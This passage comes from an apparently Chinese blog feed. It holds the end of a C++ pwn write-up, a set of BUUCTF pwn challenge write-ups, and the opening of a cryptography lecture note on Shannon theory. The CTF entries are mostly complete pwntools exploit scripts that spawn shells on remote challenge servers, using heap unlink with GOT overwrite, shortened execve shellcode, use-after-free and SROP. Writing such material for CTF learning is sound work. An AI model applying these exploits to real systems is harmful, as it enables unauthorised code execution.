function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line"></span><br><span class="line">save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">stealkey();</span><br><span class="line">fakekey(<span class="number">-0x1090F2</span>);</span><br><span class="line">run();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/64defe32793a49dbb397ae48445c5fac.png"></p><p>成功getshell。</p><p>历经艰难困苦，这道题总算是做出来了（这篇文章是笔者花了三天时间才写出来的）。通过本题我们需要注意一些关键函数的使用和一些条件控制信息的识别，就如上面提到的调用什么函数说明可能要进行参数个数的检查，调用上面函数说明可能对参数的类型有要求等等。当然做这类题目也是对我们逆向C++程序能力的训练，值得仔细深究。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (9)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-9/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-9/</url>
      
        <content type="html"><![CDATA[<h1 id="buu067-hitcon2014-stkof"><a href="#buu067-hitcon2014-stkof" class="headerlink" title="buu067-hitcon2014_stkof"></a>buu067-hitcon2014_stkof</h1><p>简单分析发现程序中开了一个很大的数组在bss段中，可以申请很多很多堆块，然后在bss段保存它们的地址。这道题不能打印有效信息，但能够产生任意长度的堆溢出，因此考虑利用方式：unlink。<br>利用方式请见：<a href="https://blog.csdn.net/qq_54218833/article/details/123407435">我的unlink笔记</a></p><p>经过调试发现，unlink可以进行。<br><img src="https://img-blog.csdnimg.cn/d4049362435a49c68b86abb51689f02d.png"><br>我们可以在此之后将bss段中的地址改成got表地址，然后将got表中free函数的地址改写为printf的plt地址，这样我们就可以实现任意地址读了。读取到libc地址然后将free.got改为system地址，释放一个存有’&#x2F;bin&#x2F;sh’的chunk即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27603</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunks = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_chunk</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">feedback</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">0x80</span>) <span class="comment"># chunk 0</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add_chunk(<span class="number">0x80</span>) <span class="comment"># chunk 1</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add_chunk(<span class="number">0x80</span>) <span class="comment"># chunk 2</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add_chunk(<span class="number">0x80</span>) <span class="comment"># chunk 3</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add_chunk(<span class="number">0x80</span>) <span class="comment"># chunk 4</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(chunks + <span class="number">8</span>*<span class="number">2</span> - <span class="number">0x18</span>)</span><br><span class="line">payload += p64(chunks + <span class="number">8</span>*<span class="number">2</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">write_chunk(<span class="number">2</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">delete_chunk(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">0</span>, <span class="number">0x8</span>, p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">write_chunk(<span class="number">4</span>, <span class="number">0x7</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete_chunk(<span class="number">4</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu068-ciscn-2019-s-9"><a href="#buu068-ciscn-2019-s-9" class="headerlink" title="buu068-ciscn_2019_s_9"></a>buu068-ciscn_2019_s_9</h1><p>shellcode题，只能写49个字节。（注意fgets函数的特性是最后一个字节一定是零字节。）</p><p>我们使用shellcraft.sh()函数查看pwntools为我们生成的shellcode，发现编译成机器码一共有44个字节。注意我们写入的49个字节里面的第36~40个字节是返回地址，不能随意动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">push 0x1010101</span><br><span class="line">xor dword ptr [esp], 0x1016972</span><br><span class="line">xor ecx, ecx</span><br><span class="line">push ecx /* null terminate */</span><br><span class="line">push 4</span><br><span class="line">pop ecx</span><br><span class="line">add ecx, esp</span><br><span class="line">push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov ecx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0xb */</span><br><span class="line">pop eax</span><br></pre></td></tr></table></figure><p>上面就是shellcode的汇编代码。我们尝试缩短这段代码的长度。<br>由于本题中并没有对零字节做出输入的限制，因此我们可以简化下面这两行为<code>push 0x6873</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x1010101</span><br><span class="line">xor dword ptr [esp], 0x1016972</span><br></pre></td></tr></table></figure><p>简化之后，剩余部分的机器码长度为36字节，正好能够填充满返回地址之前的36字节。<br>而对于后面的9个字节，首先需要压低esp，防止shellcode被覆盖：<code>sub esp, 0x100;</code>，这条指令占6字节。还有3个字节足够我们进行一次短转移。<br>在asm函数中不允许使用诸如<code>jmp short ptr 0x40;</code>这样的指令，只能通过标号来写jmp指令。但是我们通过分析jmp指令的结构不难发现，<font color=red><strong>jmp短转移指令占2字节，第1个字节固定为0xed，第二个字节为转移偏移，即距离本条指令的偏移位置。如在0x100000处有一条jmp 0x40指令，其跳转到的地址是：0x100042，因为这里是从这条指令的后面计算偏移的，也就是以0x100002为基准计算偏移。</strong></font>由此我们可以计算得到转移的偏移应该为-48，转为有符号8位二进制数为0xD0。因此我们的shellcode结构就是：前36字节为shellcode；37~40字节为返回地址（jmp esp的地址）；41~46字节为<code>sub esp, 0x100;</code>指令；47~48字节为<code>jmp short ptr -48;</code>指令，这样可以在esp减小之后立刻开始执行shellcode。我们的49个字节使用了48个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28012</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;push 0x68;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push 0x732f2f2f;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push 0x6e69622f;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;mov ebx, esp;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push 0x6873;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;xor ecx, ecx;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push ecx;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push 4;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;pop ecx;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;add ecx, esp;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;mov ecx, esp;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;xor edx, edx;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;push SYS_execve;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;pop eax;&#x27;</span> \</span><br><span class="line">            <span class="string">&#x27;int 0x80;&#x27;</span> \</span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">payload += p32(<span class="number">0x8048554</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub esp, 0x100;&#x27;</span>)   <span class="comment"># 6 bytes</span></span><br><span class="line">payload += <span class="string">b&#x27;\xeb\xD0&#x27;</span>  <span class="comment"># jmp short ptr -48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu069-pwnable-hacknote"><a href="#buu069-pwnable-hacknote" class="headerlink" title="buu069-pwnable_hacknote"></a>buu069-pwnable_hacknote</h1><p>常规堆排布，没有释放指针，可以利用UAF申请到一个chunk控制头，然后改写里面的指针从而在调用print功能的时候执行其他功能。</p><p><img src="https://img-blog.csdnimg.cn/58c0ca60e0c544c08be4df45ec0f43f5.png"><br>每一次申请都会申请上面的这个结构体和一个存放字符串的chunk。申请两个chunk大小为0x20的结构，然后释放，再申请一个chunk大小为0x8的结构就可以控制先前释放的一个结构的控制结构体（也就是上面的这个结构体）。print_func不动，把打印地址改为got表获取libc地址，然后释放重新分配，把print_func改成system地址，后面接上’||sh’来执行system(‘sh’)。（前面的部分是system地址肯定无法执行，加||使得能够执行后面的内容）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26342</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(<span class="number">0x804862B</span>) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)\</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(sys) + <span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu070-picoctf-2018-shellcode"><a href="#buu070-picoctf-2018-shellcode" class="headerlink" title="buu070-picoctf_2018_shellcode"></a>buu070-picoctf_2018_shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27164</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu071-ciscn-2019-es-7"><a href="#buu071-ciscn-2019-es-7" class="headerlink" title="buu071-ciscn_2019_es_7"></a>buu071-ciscn_2019_es_7</h1><p>一道SROP的题目，要熟悉脚本中SROP的构造方式。本题中栈的地址是经过试验得到的，后面能够泄露出一个栈地址，值为输入字符串起始地址+0x118，据此计算栈地址。</p><p>注意脚本中的flat方法用于将frame转换为一个个的字节，不能使用str函数，否则原本的1个字节’\x00’会被转换为4个字节’\x00’。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27845</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">movrax_3B_ret = <span class="number">0x4004e2</span></span><br><span class="line">movrax_F_ret = <span class="number">0x4004DA</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x4004ED</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(movrax_F_ret)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload += flat(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu072-jarvisoj-level5"><a href="#buu072-jarvisoj-level5" class="headerlink" title="buu072-jarvisoj_level5"></a>buu072-jarvisoj_level5</h1><p>同第36题，脚本都不用变。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础 Chapter 2——香农理论（一）</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="chapter-2-shannon理论"><a class="markdownIt-Anchor" href="#chapter-2-shannon理论"></a> Chapter 2 Shannon理论</h1><p>评价密码体制的安全性：<br />- 计算安全性：从计算上衡量密码体制的安全性<br />- 可证明安全性：通常使用规约法证明方案安全性<br />- 无条件安全：提供无限计算资源也无法攻破<br />上面三种安全性依次递增。</p><h2 id="一-密文概率"><a class="markdownIt-Anchor" href="#一-密文概率"></a> 一. 密文概率</h2><p>在密文中出现某一个字符的概率，与明文分布和密钥分布决定，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>Y</mi><mo>=</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(Y=y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>可以由<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(X=x),P(K=k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>推导</p><p>推广公式为：（全概率公式应用）</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>Y</mi><mo>=</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>y</mi><mo>∈</mo><mi>C</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></munder><mi>P</mi><mo 